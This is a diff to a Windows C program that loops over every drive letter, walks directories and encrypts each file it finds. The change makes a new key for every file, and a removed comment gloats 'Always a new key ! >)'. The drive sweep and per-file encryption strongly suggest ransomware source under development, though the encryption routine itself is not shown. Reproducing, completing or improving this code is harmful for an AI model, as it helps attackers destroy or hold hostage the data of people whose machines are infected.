@@ -44,8 +44,6 @@ int main (void) {
  
  srand(time(_ZERO));
 
- GenerateKey();
-
  for (i = 65; i <= 90; i++) {
   if (CheckLogicalDisk(i) == _ZERO) {
    LOCAL_DISK[_ZERO] = i;
@@ -61,10 +59,10 @@ void FindDir(unsigned char * path, unsigned char * mask) {
  WIN32_FIND_DATA wfd;
  HANDLE hfound;
 
- char newpath[MAX_PATH]  = {_ZERO};
- char fpath[MAX_PATH]    = {_ZERO};
- char pathfile[MAX_PATH] = {_ZERO};
- char delpath[MAX_PATH]  = {_ZERO};
+ unsigned char newpath[MAX_PATH]  = {_ZERO};
+ unsigned char fpath[MAX_PATH]    = {_ZERO};
+ unsigned char pathfile[MAX_PATH] = {_ZERO};
+ unsigned char delpath[MAX_PATH]  = {_ZERO};
 
  strcpy(fpath, path);
  strcat(fpath, slash);
@@ -77,7 +75,7 @@ void FindDir(unsigned char * path, unsigned char * mask) {
     strcpy(pathfile, path);
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
-    //GenerateKey(); // Always a new key ! >) 
+    GenerateKey();
     FileEncrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
